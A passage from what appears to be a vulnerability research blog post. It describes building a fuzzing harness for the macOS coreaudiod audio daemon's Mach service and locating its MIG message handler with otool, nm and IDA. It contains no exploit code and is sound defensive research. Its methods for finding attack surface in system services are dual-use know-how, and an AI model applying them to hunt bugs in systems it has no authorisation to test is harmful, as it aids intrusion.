 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Ultimately, I chose to take a look at the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;daemon, and specifically the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;com.apple.audio.audiohald&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;service for the following reasons:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_66v3bj6n178-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;It is a complex process&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;It allows Mach communications from several impactful applications, including the &lt;/span&gt;&lt;span&gt;Safari&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;GPU process&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;The Mach service had a large number of message handlers&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;The service seemed to allow control and and modification of audio hardware, which would likely require elevated privileges&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;binary and the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span&gt;&amp;nbsp;Framework it heavily uses were both closed source, which would provide a unique reverse engineering challenge&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.v5pws68vuvbc&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Create a Fuzzing Harness&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Once I chose an attack vector and target, the next step was to create a fuzzing harness capable of sending input through the attack vector (a Mach message) at a proper location within the target.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;A coverage-guided fuzzer is a powerful weapon, but only if its energy is focused in the right place&amp;mdash;like a magnifying glass concentrating sunlight to start a fire. Without proper focus, the energy dissipates, achieving little impact.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.aq06ekl2xun4&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Determining an Entry Point&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Ideally, a fuzzer should perfectly replicate the environment and capabilities available to a potential attacker. However, this isn&amp;#39;t always practical. Trade-offs often need to be made, such as accepting a higher rate of false positives for increased performance, simplified instrumentation, or ease of development. Therefore, identifying the &amp;ldquo;right place&amp;rdquo; to fuzz is highly dependent on the specific target and research goals.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.szk3zwm8w2q3&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c11&quot;&gt;Option 1: Interprocess Fuzzing&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;All Mach messages are sent and received using the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mach_msg&lt;/span&gt;&lt;span&gt;&amp;nbsp;API, as shown below. Therefore, I thought the most intuitive way to fuzz &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;lsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;Mach message handlers would be to write a fuzzing harness that called the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;API and allow my fuzzer to modify the message contents to produce crashes. The approach would look something like this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZpn9MPopg3rC6Q-PTBvEzwdI5C7gK9uMjsvkahbsuLgu59zj4tsTPgdvYoVHSIW3JaLnPGHAbxhfwDBhvsF0QYhEkkaveXARCHiEQkniJI1doLjk28z608AutSI5EnPni36WJARB52wjBDV_4PISLyag8DGFTqvHaPIg5q5K-4UO8oQlSh6eiYaUJBzU/s1999/image17.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZpn9MPopg3rC6Q-PTBvEzwdI5C7gK9uMjsvkahbsuLgu59zj4tsTPgdvYoVHSIW3JaLnPGHAbxhfwDBhvsF0QYhEkkaveXARCHiEQkniJI1doLjk28z608AutSI5EnPni36WJARB52wjBDV_4PISLyag8DGFTqvHaPIg5q5K-4UO8oQlSh6eiYaUJBzU/s1200/image17.png&quot; border=&quot;0&quot; alt=&quot;A diagram showing inter-process communication. A &amp;quot;SENDING PROCESS&amp;quot; calls mach_msg API, sending a message via &amp;quot;Mach IPC&amp;quot; to a &amp;quot;Kernel-Managed Message Queue&amp;quot;. This queue then forwards the message via &amp;quot;Mach IPC&amp;quot; to a &amp;quot;Mach Message Handler&amp;quot; in the &amp;quot;RECEIVING PROCESS&amp;quot;.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram showing inter-process communication. A &amp;quot;SENDING PROCESS&amp;quot; calls mach_msg API, sending a message via &amp;quot;Mach IPC&amp;quot; to a &amp;quot;Kernel-Managed Message Queue&amp;quot;. This queue then forwards the message via &amp;quot;Mach IPC&amp;quot; to a &amp;quot;Mach Message Handler&amp;quot; in the &amp;quot;RECEIVING PROCESS&amp;quot;.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;However, this approach had a large downside: since we were sending IPC messages, the fuzzing harness would be in a different process space than the target. &lt;/span&gt;&lt;span&gt;This meant code coverage &lt;/span&gt;&lt;span&gt;information&lt;/span&gt;&lt;span&gt;&amp;nbsp;would need to be shared across a process boundary, which is not supported by most fuzzing tools.&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;Additionally, kernel message queue processing adds a significant performance overhead. &lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.9umxs616p0iv&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c11&quot;&gt;Option 2: Direct Harness&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;While requiring a bit more work up front, another option was to write a fuzzing harness that directly loaded and called the Mach message handlers of interest. This would have the massive advantage of putting our fuzzer and instrumentation in the same process as the message handlers, allowing us to more easily obtain code coverage.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwheAIXgYpoLVKGQZIku_WZebKLjW-66lPEfYbDk7y8A8GuCmWecpLwsFxwp1k07aFPvtGAkqbRwtU6CUNRBXnvx9fRxqyUybR9Xd77hZRJ4tlr3WMBkKmmJWtnu9BZQWQQm_GVLZWoV6Lb-c1ZbEmcFW6_V0Bc8CprIi1XdtgZEqMA7yhnykTPwM9b2w/s1999/image13.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwheAIXgYpoLVKGQZIku_WZebKLjW-66lPEfYbDk7y8A8GuCmWecpLwsFxwp1k07aFPvtGAkqbRwtU6CUNRBXnvx9fRxqyUybR9Xd77hZRJ4tlr3WMBkKmmJWtnu9BZQWQQm_GVLZWoV6Lb-c1ZbEmcFW6_V0Bc8CprIi1XdtgZEqMA7yhnykTPwM9b2w/s1200/image13.png&quot; border=&quot;0&quot; alt=&quot;A diagram illustrating a SINGLE PROCESS communication. It shows Load Library &amp;amp; Call Message Handler communicating via a Fuzzing Harness to a Mach Message Handler all within the same process.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram illustrating a SINGLE PROCESS communication. It shows Load Library &amp;amp; Call Message Handler communicating via a Fuzzing Harness to a Mach Message Handler all within the same process.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;One notable downside of this fuzzing approach is that it assumes all fuzzer-generated inputs pass the kernel&amp;rsquo;s Mach message validation layer, which in a real system occurs before a message handler gets called.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As we&amp;rsquo;ll see later, this is not always the case.&lt;/span&gt;&lt;span&gt;&amp;nbsp;In my view, however, the pros of fuzzing in the same process space (speed and easy code coverage collection) outweighed the cons of a potential increase in false positives.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;The approach would be as follows:&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_b44qe3f46l3s-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Identify a suitable function for processing incoming mach messages&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Write a fuzzing harness to load the message handling code from &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Use a fuzzer to generate inputs and call the fuzzing harness&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Profit, hopefully&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.xm5vesfc12vl&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Finding the Mach Messager Handler&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;To start, I searched for the Mach service identifier, &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;com.apple.audioaudiohald&lt;/span&gt;&lt;span&gt;, but found no references to it within the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;binary. Next, I checked the libraries it loaded using &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;otool&lt;/span&gt;&lt;span&gt;. Logically, the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;framework seemed like a good candidate for housing the code for our message handler.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;otool&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;-L /usr/sbin/coreaudiod&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;/usr/sbin/coreaudiod:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/System/Library/PrivateFrameworks/caulk.framework/Versions/A/caulk (compatibility version 1.0.0, current version 1.0.0)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c3 VEfNEQsFFH-c7&quot;&gt;/System/Library/Frameworks/CoreAudio.framework/Versions/A/CoreAudio&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;(compatibility version 1.0.0, current version 1.0.0)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 2602.0.255)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/usr/lib/libAudioStatistics.dylib (compatibility version 1.0.0, current version 1.0.0, weak)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation (compatibility version 300.0.0, current version 2602.0.255)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current version 228.0.0)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 1700.255.5)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1345.120.2)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;However, I was surprised to find that the path returned by &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;otool&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;did not exist!&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;stat&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;/System/Library/Frameworks/CoreAudio.framework/Versions/A/CoreAudio&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;stat:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;/System/Library/Frameworks/CoreAudio.framework/Versions/A/CoreAudio:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;stat:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;No&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;such&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;directory&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.9umxs616p0iv&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c11&quot;&gt;The Dyld Shared Cache&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;A bit of research showed me that as of MacOS Big Sur, most framework binaries are not stored on disk but within the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://forums.developer.apple.com/forums/thread/692383&quot;&gt;dyld&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://forums.developer.apple.com/forums/thread/692383&quot;&gt;&amp;nbsp;shared cache&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a mechanism for pre-linking libraries to allow applications to run faster. Thankfully, IDA Pro, Binary Ninja, and Ghidra support parsing the &lt;/span&gt;&lt;span&gt;dyld&lt;/span&gt;&lt;span&gt;&amp;nbsp;shared cache to obtain the libraries stored within. I also used this &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/keith/dyld-shared-cache-extractor&quot;&gt;helpful tool&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;to successfully extract libraries for additional analysis.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Once I had the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span&gt;&amp;nbsp;Framework within IDA, I quickly found a call to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;bootstrap_check_in&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the service identifier passed as an argument, proving the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;framework binary was responsible for setting up the Mach service I wanted to fuzz. However, it still wasn&amp;rsquo;t obvious where the message handling code was happening, despite quite a bit of reverse engineering.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidfLj5AoMYQQL4bmGQEyJL9KdjsuJDrow1g9J1jyDQEMRmGgqRG_KEzjmp20wNFXomPYxIqBhzQuVPcx5sgo3X1k0iX-0O3xAxxjJ74EuPTWrZNPOQuqAkGvl0wX7xVyhCf7xyQvWy2g5INtg3rt_qe8GR7cdE41kipoJXk-gSYtQmBayFRuqgGFemhxI/s970/image15.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidfLj5AoMYQQL4bmGQEyJL9KdjsuJDrow1g9J1jyDQEMRmGgqRG_KEzjmp20wNFXomPYxIqBhzQuVPcx5sgo3X1k0iX-0O3xAxxjJ74EuPTWrZNPOQuqAkGvl0wX7xVyhCf7xyQvWy2g5INtg3rt_qe8GR7cdE41kipoJXk-gSYtQmBayFRuqgGFemhxI/s970/image15.png&quot; border=&quot;0&quot; alt=&quot;A screenshot of disassembled code. A function macOS_PlatformBehaviors::get_system_port is shown. A call to _bootstrap_check_in is highlighted, along with the string com.apple.audio.audiohald being passed as a service name.&quot; style=&quot;max-height: 750px; max-width: 400px;&quot;title=&quot;A screenshot of disassembled code. A function macOS_PlatformBehaviors::get_system_port is shown. A call to _bootstrap_check_in is highlighted, along with the string com.apple.audio.audiohald being passed as a service name.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;It turns out this is due to the use of the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://www.gnu.org/software/hurd/microkernel/mach/mig/gnu_mig.html&quot;&gt;Mach Interface Generator&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, (MIG) an Interface Definition Language from Apple that makes it easier to write RPC clients and servers by abstracting away much of th&lt;/span&gt;&lt;span&gt;e Mach layer.&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;When compiled, MIG message handling code gets bundled into a structure called a subsystem. One can easily grep for these subsystems to find their offsets:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$ nm -m ./System/Library/Frameworks/CoreAudio.framework/Versions/A/CoreAudio | grep -i subsystem&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(undefined) external _CACentralStateDumpRegisterSubsystem (from AudioToolboxCore)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;00007ff840470138 (__DATA_CONST,__const) non-external &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c3 VEfNEQsFFH-c7&quot;&gt;_HALC_HALB_MIGClient_subsystem&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;00007ff840470270 (__DATA_CONST,__const) non-external &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c3 VEfNEQsFFH-c7&quot;&gt;_HALS_HALB_MIGServer_subsystem&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Next, I searched in IDA for cross-references to the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_HALS_HALB_MIGServer_subsystem&lt;/span&gt;&lt;span&gt;&amp;nbsp;symbol, which identified the MIG server function that parsed incoming Mach messages! The routine is shown below, with the first parameter (the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;rdi&lt;/span&gt;&lt;span&gt;&amp;nbsp;register) being the incoming Mach message and the second (the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;rsi&lt;/span&gt;&lt;span&gt;&amp;nbsp;register) being the message to return to the client. The MIG server function extracted the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;parameter from the Mach message and used that to index into the MIG subsystem. Then, the necessary function handler was called.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis3Vc43o1cCXKh_7YJAwUMNQ6Z3BsXh7lT5oxP6Jn7SSaQdliAJ_p24UOt6tstKke3EJphabIqn0i0nUJj0iW7tAlhmVUsP-RO-ZKGW6OYYjwigDjVQrm29t_jTDeeZnM6xq5fG4mRotLimOwDdrS6w4AtmfD1t56lJnDVvu-6djqyyAjXdv3FrP78B4s/s1266/image5.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis3Vc43o1cCXKh_7YJAwUMNQ6Z3BsXh7lT5oxP6Jn7SSaQdliAJ_p24UOt6tstKke3EJphabIqn0i0nUJj0iW7tAlhmVUsP-RO-ZKGW6OYYjwigDjVQrm29t_jTDeeZnM6xq5fG4mRotLimOwDdrS6w4AtmfD1t56lJnDVvu-6djqyyAjXdv3FrP78B4s/s1200/image5.png&quot; border=&quot;0&quot; alt=&quot;A flowchart of disassembled code within HALB_MIGServer_server. Annotations highlight Incoming msg rdi and steps to Get msg ID and Get subsystem offset. This offset is then used to Index into function handler based on msg ID&amp;quot; leading to a Call function block.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A flowchart of disassembled code within HALB_MIGServer_server. Annotations highlight Incoming msg rdi and steps to Get msg ID and Get subsystem offset. This offset is then used to Index into function handler based on msg ID&amp;quot; leading to a Call function block.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
